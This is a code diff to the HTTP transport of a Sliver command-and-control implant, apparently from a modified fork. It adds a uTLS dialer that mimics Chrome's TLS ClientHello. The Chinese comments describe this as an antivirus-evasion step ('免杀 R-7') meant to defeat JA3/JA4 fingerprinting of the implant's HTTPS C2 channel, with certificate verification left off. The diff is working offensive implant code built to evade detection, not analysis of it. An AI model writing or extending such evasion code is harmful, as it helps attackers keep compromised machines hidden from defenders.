@@ -19,6 +19,7 @@ package httpclient
 */
 
 import (
+	"context"
 	"crypto/tls"
 	"net"
 	"net/http"
@@ -30,6 +31,8 @@ import (
 	"log"
 	"4zreco/sliver/implant/sliver/cryptography"
 	// {{end}}
+
+	utls "github.com/refraction-networking/utls"
 
 	"4zreco/sliver/implant/sliver/proxy"
 )
@@ -60,6 +63,11 @@ func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, er
 			}).Dial,
 			TLSHandshakeTimeout: opts.TlsTimeout,
 			TLSClientConfig:     tlsConfig,
+			// 免杀 R-7：HTTPS C2 面改用 utls 定制 ClientHello（Chrome 指纹，
+			// 方案：docs/运行时免杀R组实施方案-SleepCrypt与Unhooking.md）——
+			// Go 原生 crypto/tls 的 ClientHello 扩展顺序可被 JA3/JA4 稳定指纹化。
+			// 证书不校验的口径与原实现一致；mTLS 通道不在本项范围（见方案边界）。
+			DialTLSContext: utlsDialContext(tlsConfig, opts.TlsTimeout),
 		}
 	}
 	transport.ProxyConnectHeader = http.Header{
@@ -146,4 +154,60 @@ func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
 // restrictions such as in RFC 6265 (which we do not).
 func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
 	return jar.cookies
+}
+
+// utlsDialContext 免杀 R-7：以 utls Chrome 指纹完成 TLS 握手的 DialTLS 闭包。
+// - HelloChrome_Auto：按 utls 内置的最新 Chrome ClientHello 指纹（含 GREASE 与
+//   扩展顺序），对齐目标环境常见浏览器流量；
+// - ALPN 仅声明 http/1.1：v1 与 sliver server 兼容优先（h2 升级需 transport 层
+//   联动，列入后续精修）；JA3/JA4 的 ALPN 字段在此口径下为 http/1.1；
+// - InsecureSkipVerify 与原 stdlib 实现口径一致（HTTP 层不校验证书）；
+// - KeyLogWriter 透传（Debug 构建 wireshark 调试能力不回退）。
+func utlsDialContext(tlsConfig *tls.Config, handshakeTimeout time.Duration) func(ctx context.Context, network, addr string) (net.Conn, error) {
+	return func(ctx context.Context, network, addr string) (net.Conn, error) {
+		rawConn, err := (&net.Dialer{Timeout: handshakeTimeout}).DialContext(ctx, network, addr)
+		if err != nil {
+			return nil, err
+		}
+		host, _, splitErr := net.SplitHostPort(addr)
+		if splitErr != nil {
+			host = addr
+		}
+		cfg := &utls.Config{
+			ServerName:         host,
+			InsecureSkipVerify: tlsConfig.InsecureSkipVerify,
+			NextProtos:         []string{"http/1.1"},
+			MinVersion:         utls.VersionTLS12,
+		}
+		// {{if .Config.Debug}}
+		cfg.KeyLogWriter = tlsConfig.KeyLogWriter
+		// {{end}}
+		// Chrome 预设指纹自带 h2 ALPN，会覆盖 cfg.NextProtos——而 UConn 不实现
+		// stdlib ConnectionState 接口，http.Transport 无法升级 h2，协商出 h2 即
+		// 协议错配。故经 UTLSIdToSpec + ApplyPreset 强改 ALPN 为 http/1.1
+		//（v1 server 兼容优先；h2 联动列入后续精修）。
+		uConn := utls.UClient(rawConn, cfg, utls.HelloCustom)
+		spec, specErr := utls.UTLSIdToSpec(utls.HelloChrome_Auto)
+		if specErr != nil {
+			rawConn.Close()
+			return nil, specErr
+		}
+		for i := range spec.Extensions {
+			if alpn, ok := spec.Extensions[i].(*utls.ALPNExtension); ok {
+				alpn.AlpnProtocols = []string{"http/1.1"}
+				break
+			}
+		}
+		if err := uConn.ApplyPreset(&spec); err != nil {
+			rawConn.Close()
+			return nil, err
+		}
+		hsCtx, cancel := context.WithTimeout(ctx, handshakeTimeout)
+		defer cancel()
+		if err := uConn.HandshakeContext(hsCtx); err != nil {
+			rawConn.Close()
+			return nil, err
+		}
+		return uConn, nil
+	}
 }
